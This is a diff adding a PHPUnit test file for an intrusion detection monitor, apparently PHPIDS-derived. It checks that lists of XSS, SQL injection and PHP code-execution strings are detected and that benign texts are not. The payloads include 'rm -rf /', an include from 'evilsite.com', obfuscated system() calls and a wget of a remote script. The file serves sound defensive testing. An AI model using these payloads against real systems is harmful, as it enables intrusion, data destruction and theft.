@@ -1,0 +1,434 @@
+<?php
+
+
+namespace TE\Detector;
+
+use \TE\Init;
+use PHPUnit\Framework\TestCase;
+
+use \TE\Detector\Monitor;
+
+class MonitorTest extends TestCase
+{
+    protected $init;
+
+    public function setUp()
+    {
+        $this->init = Init::init(PATH_TO_ROOT.'/threatequation/Config.ini.php');
+        $this->init->config[ 'Caching' ][ 'caching' ] = 'none';
+    }
+
+    public function testGetHTML()
+    {
+        $test = new Monitor(
+           $this->init,
+           array(),
+           new Report($this->init)
+       );
+        $test->setHtml('test1');
+        $this->assertEquals(array('test1'), $test->getHtml());
+    }
+
+    public function testGetStorage()
+    {
+        $test = new Monitor(
+          $this->init,
+          array(),
+          new Report($this->init)
+      );
+        $this->assertInstanceOf('TE\Detector\Filter\Storage', $test->getStorage());
+    }
+
+    public function testDetect()
+    {
+        $test = new Monitor(
+          $this->init,
+          array(),
+          new Report($this->init)
+      );
+        $arr = $this->invokeMethod($test, 'detect', array('', '<a/onmouseover=alert(document.cookie) href="http://www.google.de/">Google</a>'));
+        $this->assertTrue(sizeof($arr) > 1);
+    }
+
+    public function testXSSList()
+    {
+        $exploits = array();
+        $exploits[] = '\'\'"--><script>eval(String.fromCharCode(88,83,83)));%00';
+        $exploits[] = '"></a style="xss:ex/**/pression(alert(1));"';
+        $exploits[] = 'top.__proto__._= alert
+                       _(1)';
+        $exploits[] = 'document.__parent__._=alert
+                      _(1)';
+        $exploits[] = 'alert(1)';
+        $exploits[] = 'b=/a/,
+                        d=alert
+                        d(';
+        $exploits[] = '1
+                        alert(1)';
+        $exploits[] = "crypto [ [ 'aler' , 't' ] [ 'join' ] ( [] ) ] (1) ";
+        $exploits[] = "<div/style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>";
+        $exploits[] = '_content/alert(1)';
+        $exploits[] = 'RegExp(/a/,alert(1))';
+        $exploits[] = 'x=[/&/,alert,/&/][1],x(1)';
+        $exploits[] = '[1,alert,1][1](1)';
+        $exploits[] = 'throw alert(1)';
+        $exploits[] = 'delete alert(1)';
+        $exploits[] = '$=.7.eval,$(//
+                        name
+                        ,1)';
+        $exploits[] = "$=.7.eval,$($('\rname'),1)";
+        $exploits[] = "e=1..eval
+                        e(e(\"\u200fname\"),e)";
+        $exploits[] = "<x///style=-moz-\&#x362inding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)>";
+        $exploits[] = "a//a'\u000aeval(name)";
+        $exploits[] = "a//a';eval(name)";
+        $exploits[] = '(x) setter=0?0.:alert,x=0';
+        $exploits[] = "y=('na') + new Array +'me'
+                        y
+                        (x)getter=0?0+0:eval,x=y
+                        'foo bar foo bar f'";
+        $exploits[] = "'foo bar foo bar foo bar foo bar foo bar foo bar foo bar foo'
+                        y$=('na') +new Array+'me'
+                        x$=('ev') +new Array+'al'
+                        x$=0[x$]
+                        x$(x$(y$)+y$)";
+        $exploits[] = '<applet/src=http://businessinfo.co.uk/labs/xss.html
+                        type=text/html>';
+        $exploits[] = 'onabort=onblur=onchange=onclick=ondblclick=onerror=onfocus=onkeydown=onkeypress=onkeyup=onload=onmousedown=onmousemove=onmouseout=onmouseover=onmouseup=onreset=onresize=onselect=onsubmit=onunload=alert';
+        $exploits[] = 'onload=1&&alert';
+        $exploits[] = "document.createStyleSheet('http://businessinfo.co.uk/labs/xss/xss.css')";
+        $exploits[] = 'document.body.style.cssText=name';
+        $exploits[] = 'for(i=0;;)i';
+        $exploits[] = 'stop.sdfgkldfsgsdfgsdfgdsfg in alert(1)';
+        $exploits[] = 'this .fdgsdfgsdfgdsfgdsfg
+                        this .fdgsdfgsdfgdsfgdsfg
+                        this .fdgsdfgsdfgdsfgdsfg
+                        this .fdgsdfgsdfgdsfgdsfg
+                        this .fdgsdfgsdfgdsfgdsfg
+                        aaaaaaaaaaaaaaaa :-(alert||foo)(1)||foo';
+        $exploits[] = "(this)[new Array+('eva')+new Array+ 'l'](/foo.bar/+name+/foo.bar/)";
+        $exploits[] = '<video/title=.10000/aler&#x74;(1) onload=.1/setTimeout(title)>';
+        $exploits[] = 'const urchinTracker = open';
+        $exploits[] = "-setTimeout(
+                        1E1+
+                        ',aler\
+                        t ( /phpids rocks/ ) + 1E100000 ' )";
+        $exploits[] = '<b/alt="1"onmouseover=InputBox+1 language=vbs>test</b>';
+        $exploits[] = '$$=\'e\'
+                        _=$$+\'val\'
+                        $=_
+                        x=this[$]
+                        y=x(\'nam\' + $$)
+                        x(y)
+                        \'foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar\'';
+        $exploits[] = '＜script>alert("xss")＜/script>';
+        $exploits[] = '‹img/src=x""onerror=alert(1)///›';
+        $exploits[] = 'Image() .
+                        ownerDocument .x=1';
+        $exploits[] = urldecode('%FF%F0%80%BCimg%20src=x%20onerror=alert(1)//');
+        $exploits[] = "',jQuery(\"body\").html(//);\'a'";
+        $exploits[] = '\',$(fred).set(\'html\',\'magically changes\')
+                        \'s';
+        $exploits[] = "',YAHOO.util.Get.script(\"http://ha.ckers.org/xss.js\")
+                        's";
+        $exploits[] = 'lo=/,Batman/,alert(\'Batman flew here\')';
+        $exploits[] = '<img src=xonerror=alert(1)>';
+        $exploits[] = "for(lo in{j:this}.j)!/ale.t/(lo)||this[{},lo](+!'')";
+        $exploits[] = 't="t (1),0 ",
+                        x2 = (1, {x2:02.constructor,a:0}.x2),
+                        xyz = (1, {xyz:x2.constructor,a:0}.xyz),
+                        xyz("aler" + t)()';
+        $exploits[] = 'xzy={x :this}.x.alert
+                        xzy(1)';
+        $exploits[] = 'xyz=Iterator([this]).next()
+                        zyx=xyz[1].alert
+                        zyx(1)';
+
+        $test = new Monitor(
+            $this->init,
+            array(),
+            new Report($this->init)
+        );
+        foreach ($exploits as $key => $value) {
+            $arr = $this->invokeMethod($test, 'detect', array('', $value));
+            $this->assertTrue(sizeof($arr) > 1);
+        }
+    }
+
+    public function testSQLIList()
+    {
+        $exploits = array();
+        $exploits[] = '" OR 1=1#';
+        $exploits[] = '; DROP table Users --';
+        $exploits[] = '/**/S/**/E/**/L/**/E/**/C/**/T * FROM users WHERE 1 = 1';
+        $exploits[] = 'admin\'--';
+        $exploits[] = 'SELECT /*!32302 1/0, */ 1 FROM tablename';
+        $exploits[] = '10;DROP members --';
+        $exploits[] = ' SELECT IF(1=1,\'true\',\'false\')';
+        $exploits[] = 'SELECT CHAR(0x66)';
+        $exploits[] = 'SELECT LOAD_FILE(0x633A5C626F6F742E696E69)';
+        $exploits[] = 'EXEC(@stored_proc @param)';
+        $exploits[] = 'chr(11)||chr(12)||char(13)';
+        $exploits[] = 'MERGE INTO bonuses B USING (SELECT';
+        $exploits[] = '1 or name like \'%\'';
+        $exploits[] = '1 OR \'1\'!=0';
+        $exploits[] = '1 OR ASCII(2) = ASCII(2)';
+        $exploits[] = '1\' OR 1&"1';
+        $exploits[] = '1\' OR \'1\' XOR \'0';
+        $exploits[] = '1 OR+1=1';
+        $exploits[] = '1 OR+(1)=(1)';
+        $exploits[] = '1 OR \'1';
+        $exploits[] = 'aaa\' or (1)=(1) #!asd';
+        $exploits[] = 'aaa\' OR (1) IS NOT NULL #!asd';
+        $exploits[] = 'a\' or 1=\'1';
+        $exploits[] = 'asd\' union (select username,password from admins) where id=\'1';
+        $exploits[] = "1'; WAITFOR TIME '17:48:00 ' shutdown -- -a";
+        $exploits[] = "1'; anything: goto anything -- -a";
+        $exploits[] = "' =+ '";
+        $exploits[] = "asd' =- (-'asd') -- -a";
+        $exploits[] = 'aa"in+ ("aa") or -1 != "0';
+        $exploits[] = 'aa" =+ - "0  ';
+        $exploits[] = "aa' LIKE 0 -- -a";
+        $exploits[] = "aa' LIKE md5(1) or '1";
+        $exploits[] = "aa' REGEXP- md5(1) or '1";
+        $exploits[] = "aa' DIV@1 = 0 or '1";
+        $exploits[] = "aa' XOR- column != -'0";
+        $exploits[] = '============================="';
+        $exploits[] = 'union select password from users where 1';
+        $exploits[] = "str'=version()
+                        UNION#
+                        #
+                        #
+                        #
+                        SELECT group_concat(table_name)#
+                        ##
+                        /*!FROM*/ information_schema.tables WHERE '1";
+
+        $test = new Monitor(
+          $this->init,
+          array(),
+          new Report($this->init)
+      );
+        foreach ($exploits as $key => $value) {
+            $arr = $this->invokeMethod($test, 'detect', array('', $value));
+            $this->assertTrue(sizeof($arr) > 1);
+        }
+    }
+
+    public function testRFEList()
+    {
+        $exploits = array();
+        $exploits[] = ';phpinfo()';
+        $exploits[] = '@phpinfo()';
+        $exploits[] = '"; <?php exec("rm -rf /"); ?>';
+        $exploits[] = '; file_get_contents(\'/usr/local/apache2/conf/httpd.conf\');';
+        $exploits[] = ';echo file_get_contents(implode(DIRECTORY_SEPARATOR, array("usr","local","apache2","conf","httpd.conf"))';
+        $exploits[] = '; include "http://evilsite.com/evilcode"';
+        $exploits[] = '; rm -rf /\0';
+        $exploits[] = '"; $_a=(! \'a\') . "php"; $_a.=(! \'a\') . "info"; $_a(1); $b="';
+        $exploits[] = '";
+                        define ( _a, "0008avwga000934mm40re8n5n3aahgqvaga0a303") ;
+                        if  ( !0) $c = USXWATKXACICMVYEIkw71cLTLnHZHXOTAYADOCXC ^ _a;
+                        if  ( !0) system($c) ;//';
+        $exploits[] = '" ; //
+                        if (!0) $_a ="". str_rot13(\'cevags\'); //
+                        $_b = HTTP_USER_AGENT; //
+                        $_c="". $_SERVER[$_b]; //
+                        $_a( `$_c` );//';
+        $exploits[] = '"; //
+                        $_c = "" . $_a($b);
+                        $_b(`$_c`);//';
+        $exploits[] = '" ; //
+                        if  (!0) $_a = base64_decode ;
+                        if  (!0) $_b = parse_str ; //
+                        $_c = "" . strrev("ftnirp");
+                        if  (!0)  $_d = QUERY_STRING; //
+                        $_e= "" . $_SERVER[$_d];
+                        $_b($_e); //
+                        $_f = "" . $_a($b);
+                        $_c(`$_f`);//';
+        $exploits[] = '" ; //
+                        $_y = "" . strrev("ftnirp");
+                        if  (!0)    $_a = base64_decode ;
+                        if  (!0)    $_b="" . $_a(\'cHdk\');
+                        if (!0) $_y(`$_b`);//';
+        $exploits[] = '";{ if (true) $_a  = "" . str_replace(\'!\',\'\',\'s!y!s!t!e!m!\');
+                        $_a( "dir"); } //';
+        $exploits[] = '";{ if (true) $_a  = "" . strtolower("pass");
+                        if   (1) $_a.= "" . strtolower("thru");
+                        $_a( "dir"); } //';
+        $exploits[] = '";{if (!($_b[]++%1)) $_a[]  = system;
+                        $_a[0]( "ls"); } //';
+        $exploits[] = '";{if (pi) $_a[]  = system;
+                        $_a[0]( "ls");  } //';
+        $exploits[] = '";; //
+                        if (!($_b[]  %1)) $_a[0]  = system;
+                        $_a[0](!a. "ls");  //';
+        $exploits[] = '; e|$a=&$_GET; 0|$b=!a .$a[b];$a[a](`$b`);//';
+        $exploits[] = 'aaaa { $ {`wget hxxp://example.com/x.php`}}';
+
+        $test = new Monitor(
+            $this->init,
+            array(),
+            new Report($this->init)
+        );
+        foreach ($exploits as $key => $value) {
+            $arr = $this->invokeMethod($test, 'detect', array('', $value));
+            $this->assertTrue(sizeof($arr) > 1);
+        }
+    }
+
+    public function testAllowedHTMLScanningPositive()
+    {
+        $exploits = array();
+        $exploits[] = '<a/onmouseover=alert(document.cookie) href="http://www.google.de/">Google</a>';
+        $exploits[] = '<table width="500"><tr><th>Test</th><iframe/onload=alert(1)> </tr><tr><td>test</td></tr></table>';
+        $exploits[] = '<a style="background:url(//lo/)}lo:expression\(alert(1)));">lo</a>';
+        $exploits[] = '<div style="-moz-binding:url(http://h4k.in/mozxss.xml#xss)">hello!</div>';
+        $exploits[] = '<img src="javascript:alert(1)">';
+        $exploits[] = '<script>alert(1)</script><h1>headline</h1><p>copytext</p>';
+        $exploits[] = '<img src src src src=x onerror=alert(1)>';
+        $exploits[] = '<img src=1 onerror=alert(1) alt=1>';
+        $exploits[] = '<b "<script>alert(1)</script>">hola</b>';
+        $exploits[] = '<img src=phpids_logo.gif alt=Logo onreadystatechange=MsgBox-1 language=vbs>';
+        $exploits[] = '<img src="." =">" onerror=alert(1);//';
+        $exploits[] = '<img src="." =">" onerror=alert(222222222222222222222222222222222222222222222222222,1);//';
+        $exploits[] = '<img src="." =">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa onerror = alert(1)/&#10;/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
+        $exploits[] = '<a style="background:url(http://hh*/)}lo:expression(this.lol?0:alert(this.lol=1))/*%31);">lo</a>';
+        $exploits[] = '<a style="background:url(/hyyuj)&#125lo:expression&#40alert&#40/1/&#41//)/*lo);">lo</a>';
+        $exploits[] = '<img src= # onerror = alert(1) <b>foo</b>';
+        $exploits[] = '<a style="background:url(//lo/\\)}lo:expression\000028alert\000028/1/\000029\000029/*lo);">lo</a>';
+        $exploits[] = '<?xml:namespace prefix=xss><?import namespace=xss implementation=http://ha.ckers.org/xss.htc><xss:*>lo</xss:*>';
+        $exploits[] = '<a style="background:url(//mh.mh/\)!*mh:expression\(write\(1\));">lo</a> // you discovered';
+        $exploits[] = '<a href="http://ha.ckers.org/xss.css" style="background:url(/**/javascript:document.documentElement.firstChild.lastChild.href=document.documentElement.firstChild.nextSibling.lastChild.previousSibling.previousSibling.lastChild.previousSibling.previousSibling.lastChild.lastChild.lastChild.lastChild.lastChild.href);">lo</a>';
+        $exploits[] = "<img src=http://lo.lo/lo = '> ' onerror=alert(1)//";
+        $exploits[] = '<div style="color:white;>;lo:expression\\\28\\\77rite\\\28 1\\\29\\\29;';
+        $exploits[] = '<div style="background:url(\'http://lo.lo/lo\',!/lo:expression(write(1))/*\');">lo</div>';
+
+        $test = new Monitor(
+            $this->init,
+            array(),
+            new Report($this->init)
+        );
+        foreach ($exploits as $key => $value) {
+            $arr = $this->invokeMethod($test, 'detect', array('', $value));
+            $this->assertTrue(sizeof($arr) > 1);
+        }
+    }
+
+    public function testAllowedHTMLScanningNegative()
+    {
+        $exploits = array();
+
+        $exploits[] = '<h1>headline</h1><p>copytext</p>
+                               <p>bodytext &copy; 2008</p>     <h2>test
+                               </h2>';
+
+        $test = new Monitor(
+            $this->init,
+            array(),
+            new Report($this->init)
+        );
+        foreach ($exploits as $key => $value) {
+            $arr = $this->invokeMethod($test, 'detect', array('', $value));
+            $this->assertTrue(sizeof($arr) == 0);
+        }
+    }
+
+    public function testJSONScanning()
+    {
+        $exploits = array();
+        $exploits[] = '{"a":"b","c":["><script>alert(1);</script>", 111, "eval(name)"]}';
+        $test = new Monitor(
+            $this->init,
+            array(),
+            new Report($this->init)
+        );
+        foreach ($exploits as $key => $value) {
+            $arr = $this->invokeMethod($test, 'detect', array('', $value));
+            $this->assertTrue(sizeof($arr) > 1);
+        }
+    }
+
+    public function testForFalseAlerts()
+    {
+        $exploits = array();
+        $exploits[] = 'war bereits als Gastgeber automatisch für das Turnier qualifiziert. Die restlichen 15 Endrundenplätze wurden zwischen Juni
+                       2005 und Mai 2007 ermittelt. Hierbei waren mit Ausnahme der UEFA-Zone die jeweiligen Kontinentalmeisterschaften gleichzeitig
+                       das Qualifikationsturnier für die Weltmeisterschaft. Die UEFA stellt bei der Endrunde fünf Mannschaften. Die Teilnehmer wurden in
+                       einer Qualifikationsphase ermittelt, die am 9. Juli 2005 startete und am 30. September 2006 endete. Hierbei wurden die 25 Mannschaften der Kategorie A in fünf
+                       Gruppen zu je 5 Mannschaften eingeteilt, wobei sich die fünf Gruppensieger für die Endrunde qualifizierten. Das erste europäische Ticket löste Norwegen am 27.
+                       August 2006. Am 24. September folgte Schweden, drei Tage später konnten sich auch der amtierende Weltmeister Deutschland und Dänemark für die Endrunde qualifizieren.
+                       England sicherte sich am 30. September 2006 das letzte Ticket gegen Frankreich. Die Mannschaften der Kategorie B spielten lediglich um den Aufstieg in die A-Kategorie.
+                       Dem südamerikanischen Fußballverband CONMEBOL standen zwei Startpätze zu. Sie wurden bei der Sudamericano Femenino 2006, welche vom 10. bis 26. November 2006
+                       im argentinischen Mar del Plata ausgetragen wurde, vergeben. Argentinien gewann das Turnier überraschend vor Brasilien. Beide Mannschaften qualifizierten sich
+                       für die Endrunde. Die zwei nordamerikanischen Teilnehmer wurden beim CONCACAF Women\'s Gold Cup 2006 in den Vereinigten Staaten ermittelt. Das Turnier fand in
+                       der Zeit vom 19. bis zum 30. November 2006 in Carson und Miami statt. Sieger wurde das US-amerikanische Team vor Kanada. Die drittplatzierten Mexikanerinnen
+                       spielten gegen den Asien-Vierten Japan um einen weiteren Startplatz, scheiterten aber in den Play-Off-Spielen. Die Afrikameisterschaft der Frauen wurde vom 28.
+                       Oktober bis zum 11. November 2006 in Nigeria ausgetragen. Die Mannschaft der Gastgeber setzte sich im Finale gegen Ghana durch. Beide Mannschaften werden den
+                       afrikanischen Fußballverband bei der WM vertreten. Die Asienmeisterschaft der Frauen fand im Juli 2006 in Australien statt. Neben den Chinesinnen, die sich mit
+                       einem Sieg über den Gastgeber den Titel sicherten, qualifizierten sich zudem die Australierinnen sowie die drittplatzierten Nordkoreanerinnen für die Endrunde.
+                       Japan setzte sich wie 2003 in den Play-Off-Spielen gegen Mexiko (2:0 und 1:2) durch. Ozeanien hat einen direkten Startplatz,
+                       der bei der Ozeanischen Frauenfußballmeisterschaft im April 2007 vergeben wurde. Neuseeland bezwang Papua-Neuguinea mit 7:0 und sicherte sich damit
+                       das Ticket für die Weltmeisterschaft.';
+        $exploits[] = 'Thatcher föddes som Margaret Hilda Roberts i staden Grantham i Lincolnshire, England. Hennes far var Alfred Roberts, som ägde en speceriaffär i
+                       staden, var aktiv i lokalpolitiken (och hade ämbetet alderman), samt var metodistisk lekmannapredikant. Roberts kom från en liberal familj men kandiderade?som då var
+                       praxis i lokalpolitik?som oberoende. Han förlorade sin post som Alderman 1952 efter att Labourpartiet fick sin första majoritet i Grantham Council 1950. Hennes mor var
+                       Beatrice Roberts, född Stephenson, och hon hade en syster, Muriel (1921-2004). Thatcher uppfostrades som metodist och har förblivit kristen under hela sitt liv.[1]
+                       Thatcher fick bra resultat i skolan. Hon gick i en grammar school för flickor (Kesteven) och kom sedan till Somerville College, Oxfords universitet 1944 för att studera
+                       Xylonite och sedan J. Lyons and Co., där hon medverkade till att ta fram metoder för att bevara glass. Hon ingick i den grupp som utvecklade den första frysta mjukglassen.
+                        Hon var också medlem av Association of Scientific Workers. Politisk karriär mellan 1950 och 1970 [redigera] Vid valen 1950 och 1951 ställde Margaret Roberts upp i v
+                       alkretsen Dartford, som var en säker valkrets för Labour. Hon var då den yngsta kvinnliga konservativa kandidaten någonsin. Medan hon var aktiv i det konservativa pa
+                       ficerad som barrister 1953. Samma år föddes hennes tvillingbarn Carol och Mark. Som advokat specialiserade hon sig på skatterätt. Thatcher började sedan leta efter en
+                       för Finchley i april 1958. Hon invaldes med god marginal i valet 1959 och tog säte i underhuset. Hennes jungfrutal var till stöd för hennes eget förslag om att tvinga
+                       kommunala församlingar att hålla möten offentligt, vilket blev antaget. 1961 gick hon emot partilinjen genom att rösta för återinförande av bestraffning med ris. Hon
+                       befordrades tidigt till regeringen som underordnad minister (Parliamentary Secretary) i ministeriet för pensioner och socialförsäktingar (Ministry of Pensions and
+                       National Insurance) i september 1961. Hon behöll denna post tills de konservativa förlorade makten i valet 1964. När Sir Alec Douglas-Home avgick röstade Thatcher för
+                       Edward Heath i valet av partiledare 1965. När Heath hade segrat belönades hon med att bli de konservativas talesman i bostads- och markfrågor. Hon antog den politik
+                       som hade utvecklats av hennes kollega James Allason, att sälja kommunägda bostäder till deras hyresgäster. Detta blev populärt i senare val[2]. Hon flyttade till
+                       skuggfinansgruppen efter 1966..';
+        $exploits[] = "Results are 'true' or 'false'.";
+        $exploits[] = 'Choose between "red" and "green". ';
+        $exploits[] = "SQL Injection contest is coming in around '1 OR '2 weeks.";
+        $exploits[] = 'select *something* from the menu';
+        $exploits[] = '<![CDATA[:??]]>';
+        $exploits[] = 'website_link => /app/search?op=search;keywords=peter%20testcase;';
+        $exploits[] = '<xjxobj><e><k>insert</k><v>insert</v></e><e><k>errorh</k><v>error</v></e><e><k>hostname</k><v>ab</v></e><e><k>ip</k><v>10.2.2.22</v></e><e><k>asset</k><v>2</v></e><e><k>thresholdc</k><v>30</v></e><e><k>thresholda</k><v>30</v></e><e><k>rrd_profile</k><v></v></e><e><k>nat</k><v></v></e><e><k>nsens</k><v>1</v></e><e><k>os</k><v>Unknown</v></e><e><k>mac</k><v></v></e><e><k>macvendor</k><v></v></e><e><k>descr</k><v><![CDATA[&]]></v></e></xjxobj>';
+        $exploits[] = '"hi" said the mouse to the cat and \'showed off\' her options';
+        $exploits[] = 'eZtwEI9v7nI1mV4Baw502qOhmGZ6WJ0ULN1ufGmwN5j+k3L6MaI0Hv4+RlOo42rC0KfrwUUm5zXOfy9Gka63m02fdsSp52nhK0Jsniw2UgeedUvn0SXfNQc/z13/6mVkcv7uVN63o5J8xzK4inQ1raknqYEwBHvBI8WGyJ0WKBMZQ26Nakm963jRb18Rzv6hz1nlf9cAOH49EMiD4vzd1g==';
+        $exploits[] = '"European Business School (ebs)"';
+        $exploits[] = '"Deutsche Journalistenschule (DJS)"';
+        $exploits[] = '"Cambridge First Certificate FCE (2000)"';
+        $exploits[] = 'Universität Karlsruhe (TH)';
+        $exploits[] = 'Psychologie, Coaching und Training, Wissenserlangung von Führungskräften, Menschen bewegen, Direktansprache, Erfolg, Spaß, Positiv Thinking and Feeling, Natur, Kontakte pflegen, Face to Face Contact, Sport/Fitness (Fussball, Beachvolleyball, Schwimmen, Laufen, Krafttraining, Bewegungsübungen uvm.), Wellness & Beauty';
+        $exploits[] = 'Großelternzeit - (Sachbearbeiter Lightfline)';
+        $exploits[] = '{HMAC-SHA1}{48de2031}{8AgxrQ==}';
+        $exploits[] = 'exchange of experience in (project) management and leadership • always interested in starting up business and teams • people with a passion • new and lost international contacts';
+        $exploits[] = 'Highly mobile (Project locations: Europe & Asia), You are a team player';
+        $exploits[] = "'Reservist, Status: Stabsoffizier'";
+        $exploits[] = ')))) да второй состав в отличной форме, не оставили парням ни единого шанса!!! Я думаю нас jedi, можно в первый переводить ))) ';
+        $exploits[] = 'd3d3LmRlbW90eXdhdG9yeS5wbA==';
+        $exploits[] = '"Einkäuferin Zutaten + Stoffe"';
+        $exploits[] = '"mooie verhalen in de talen: engels"';
+        $exploits[] = '[CS]v1|267135E1851D3753-6000013720017F11[CE] /catalog/rss-new.php';
+
+        $test = new Monitor(
+           $this->init,
+           array(),
+           new Report($this->init)
+       );
+        foreach ($exploits as $key => $value) {
+            $arr = $this->invokeMethod($test, 'detect', array('', $value));
+            $this->assertTrue(sizeof($arr) == 0);
+        }
+    }
+    /*call the provate methods*/
+    private function invokeMethod(&$object, $methodName, array $parameters = array())
+    {
+        $reflection = new \ReflectionClass(get_class($object));
+        $method = $reflection->getMethod($methodName);
+        $method->setAccessible(true);
+
+        return $method->invokeArgs($object, $parameters);
+    }
+}
